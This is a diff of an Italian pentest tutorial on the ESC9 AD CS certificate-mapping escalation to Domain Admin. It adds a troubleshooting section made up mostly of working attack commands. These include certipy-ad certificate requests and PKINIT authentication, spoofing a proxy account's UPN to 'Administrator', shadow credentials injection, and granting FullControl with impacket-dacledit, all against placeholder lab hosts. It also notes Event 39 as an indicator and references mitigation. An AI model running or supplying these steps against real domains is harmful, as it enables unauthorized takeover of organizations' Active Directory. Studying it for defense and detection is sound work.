@@ -5,18 +5,18 @@ description: ESC9 sfrutta template AD CS senza SID Security Extension per impers
 image: /9.webp
 draft: false
 date: 2026-03-08T00:00:00.000Z
+lastmod: 2026-06-26T00:00:00.000Z
 categories:
   - windows
 subcategories:
   - privilege-escalation
 tags:
-  - ad
   - adcs
-  - esc
+  - esc9
   - certipy
 ---
 
-# ESC9 ADCS: Escalazione a Domain Admin via Weak Certificate Mapping | Certipy Exploitation + Event 39/41 Detection + Mitigazione (KB5014754) 2026
+# ESC9 ADCS: PrivEsc a Domain Admin via Weak Certificate Mapping | Certipy Exploitation + Event 39/41 Detection + Mitigazione (KB5014754) 2026
 
 **ESC9** è una misconfiguration critica in Active Directory Certificate Services (ADCS) che consente di escalare privilegi impersonando utenti privilegiati come Domain Admin. A differenza di altre ESC (ESC1, ESC2, ecc.), ESC9 non si basa su problemi di enrollment diretti, ma su **certificate mapping debole** — il processo attraverso il quale Active Directory associa un certificato a un account AD.
 
@@ -560,6 +560,194 @@ certipy-ad shadow auto -u attacker@domain.local -p Password123 \
 
 ***
 
+## Errori Comuni & Troubleshooting
+
+### CERTSRV\_E\_SUBJECT\_EMAIL\_REQUIRED
+
+**Causa:** Template forza email in subject/SAN, ma account proxy non ha email valida o configurata.
+
+**Fix:**
+
+```bash
+# Aggiungere email all'account proxy
+impacket-net.py domain.local/attacker:Password123 -dc-ip 192.168.1.100 \
+  user edit -username proxy_user -email "proxy@domain.local"
+
+# Riprovare cert request
+certipy-ad req -u 'proxy_user@domain.local' -hashes ':hash_nt' \
+  -ca 'domain-DC-CA' -template 'TemplateName' -dc-ip 192.168.1.100
+```
+
+***
+
+### KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN
+
+**Causa:** UPN nel certificato non mappa correttamente. Spesso perché UPN non è stato ripristinato PRIMA di autenticazione.
+
+**Fix:**
+
+```bash
+# Verificare che UPN sia stato ripristinato
+ldapsearch -H ldap://192.168.1.100 -D 'CN=attacker,CN=Users,DC=domain,DC=local' \
+  -w Password123 -b 'DC=domain,DC=local' \
+  '(sAMAccountName=proxy_user)' userPrincipalName
+
+# Se ancora "Administrator", ripristinare ora
+certipy-ad account update -u 'attacker@domain.local' -p 'Password123' \
+  -user proxy_user -upn 'proxy_user@domain.local' -dc-ip 192.168.1.100
+
+# Aspettare replication (10-15 sec) e riprovare auth
+sleep 15
+certipy-ad auth -pfx administrator.pfx -domain domain.local -dc-ip 192.168.1.100
+```
+
+***
+
+### A\_ATT\_MATCH\_ERROR / Certificate Validation Failed
+
+**Causa:** StrongCertificateBindingEnforcement = 2 (Full Enforcement). DC richiede objectSid nel cert, ma template ha CT\_FLAG\_NO\_SECURITY\_EXTENSION.
+
+**Fix - IMPOSSIBILE sfruttare ESC9 in questo ambiente:**
+
+Verificare registry DC:
+
+```batch
+reg query "HKLM\System\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
+```
+
+Se output = 2: ESC9 è completamente bloccato. Cercare ESC1, ESC6, ESC8 alternativi.
+
+Se output = 0 o 1: Verificare che template abbia veramente CT\_FLAG\_NO\_SECURITY\_EXTENSION:
+
+```bash
+certipy-ad find -u 'attacker@domain.local' -p 'Password123' \
+  -dc-ip 192.168.1.100 -vulnerable -enabled
+```
+
+***
+
+### KDC\_ERR\_PADATA\_TYPE\_NOSUPP
+
+**Causa:** DC non supporta PKINIT per autenticazione con certificato (raro, default = abilitato).
+
+**Fix:**
+
+```bash
+# Verificare che PKINIT sia abilitato su DC
+reg query "HKLM\System\CurrentControlSet\Services\Kdc" /v PreComputedAuthenticationTypes
+
+# Se fallisce, usare Kerberos over TLS (Schannel) instead:
+# Verificare CertificateMappingMethods è configurato
+reg query "HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel" /v CertificateMappingMethods
+
+# Output atteso: 0x18 (default) o contiene 0x02 (UPN mapping)
+```
+
+***
+
+### Event 39 Generato ma Auth Succeeded (Comportamento Atteso)
+
+**Causa:** StrongCertificateBindingEnforcement = 1 (Compatibility Mode). DC loga weak mapping ma consente auth ugualmente.
+
+**Nota:** NON è un errore — è il comportamento esatto che ESC9 sfrutta.
+
+**Azione:** Monitor Event 39 per rilevare tentativi in real-time. Event 39 = **IOC primario** dell'attacco.
+
+***
+
+### UPN Spoof Non Funziona (Cert Mappato a proxy\_user Invece di Administrator)
+
+**Causa:** Replication ritardo o DC cache non aggiornata.
+
+**Fix:**
+
+```bash
+# Verificare UPN corrente
+ldapsearch -H ldap://192.168.1.100 -D 'CN=attacker,CN=Users,DC=domain,DC=local' \
+  -w Password123 -b 'DC=domain,DC=local' \
+  '(sAMAccountName=proxy_user)' userPrincipalName
+
+# Attendere 15-30 sec dopo UPN change prima di cert request
+# Se problema persiste, usare bare UPN (NO @domain):
+certipy-ad account update -u 'attacker@domain.local' -p 'Password123' \
+  -user proxy_user -upn 'Administrator' -dc-ip 192.168.1.100
+
+# Poi fare cert request:
+certipy-ad req -u 'proxy_user@domain.local' -hashes ':hash_nt' \
+  -ca 'domain-DC-CA' -template 'TemplateName' -dc-ip 192.168.1.100
+```
+
+***
+
+### Shadow Credentials Injection Fallisce (Account Locked / Permission Denied)
+
+**Causa:** Permessi insufficienti su account target o account è protetto.
+
+**Fix:**
+
+```bash
+# Verificare permessi reali
+impacket-dacledit -action read -dc-ip 192.168.1.100 \
+  domain.local/attacker:'Password123' \
+  -principal attacker -target proxy_user
+
+# Se solo WriteOwner/WriteDACL, escalare prima:
+impacket-dacledit -action write -rights 'FullControl' \
+  -principal attacker -target proxy_user -dc-ip 192.168.1.100 \
+  domain.local/attacker:'Password123'
+
+# Poi ritentare shadow credentials:
+certipy-ad shadow auto -u 'attacker@domain.local' \
+  -p 'Password123' -account proxy_user -dc-ip 192.168.1.100
+```
+
+***
+
+### Template Non Appare in Certipy Output (Even with -vulnerable Flag)
+
+**Causa:** Template non è published su CA o è disabled.
+
+**Fix:**
+
+```bash
+# Cercare tutti i template (non solo vulnerable):
+certipy-ad find -u 'attacker@domain.local' -p 'Password123' \
+  -dc-ip 192.168.1.100 -stdout
+
+# Verificare se template è listed e con quale stato
+# Se manca, verificare su CA direttamente:
+# → Apri certsrv.msc → Certificate Templates → Gestisci
+# → Cerca template → Right-click → Pubblica su DC
+
+# Oppure da PowerShell:
+Get-ADObject -Filter {objectClass -eq 'pKICertificateTemplate'} \
+  -Properties displayName,msPKI-Enrollment-Flag | \
+  Where-Object {$_.displayName -like "*TemplateName*"}
+```
+
+***
+
+### Certificate Request Timeout / Connection Refused
+
+**Causa:** CA non è raggiungibile o IP DC errato.
+
+**Fix:**
+
+```bash
+# Verificare reachability CA
+nxc ldap 192.168.1.100 -u attacker -p Password123 -d domain.local
+
+# Ottenere corretto FQDN CA
+nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local
+
+# Riprovare con FQDN corretto:
+certipy-ad req -u 'proxy_user@domain.local' -hashes ':hash_nt' \
+  -ca 'domain-DC-CA' -template 'TemplateName' \
+  -target dc01.domain.local -dc-ip 192.168.1.100
+```
+
+***
+
 ## Mitigazione
 
 ### 1. Abilitare Full Enforcement (PRIMARIO)
@@ -664,4 +852,6 @@ Per organizzazioni che devono mantenere backward compat con vecchi cert (pre-mag
 
 ## Riferimenti
 
+* [https://ring0shady.github.io/posts/esc9/](https://ring0shady.github.io/posts/esc9/) — ESC9 & ESC10 deep dive
 * [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy) — Certipy (tool primary)
+* /silver-ticket (link interno hackita.it)
